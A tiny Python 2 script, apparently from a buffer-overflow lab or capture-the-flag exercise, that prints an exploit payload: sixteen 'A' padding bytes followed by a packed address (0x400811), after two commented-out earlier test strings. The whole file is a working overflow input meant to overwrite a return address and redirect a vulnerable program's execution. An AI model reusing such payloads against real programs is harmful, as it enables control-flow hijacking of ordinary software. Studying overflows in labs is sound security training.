#!/usr/bin/python

# this is a python 2 program

import sys

# test 1
#overflow = 'abcd'

# test 2
#overflow = '\x61\x62\x63\x64\x65'

# test 3
overflow = '\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x08\x40\x00\x00\x00\x00\x00'

sys.stdout.write(overflow)
